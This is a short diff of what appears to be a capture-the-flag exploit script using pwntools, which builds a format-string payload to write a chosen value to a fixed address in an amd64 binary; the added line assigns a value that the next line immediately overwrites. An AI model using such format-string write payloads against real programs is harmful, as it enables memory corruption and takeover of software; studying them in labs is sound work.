@@ -13,6 +13,7 @@ elf = ELF(binary)
 context.arch = "amd64"
 
 key_addr = 0x60106c
+key_value = 0xda
 key_value = 0xdeadbeef
 
 payload = fmtstr_payload(6,{key_addr:key_value})
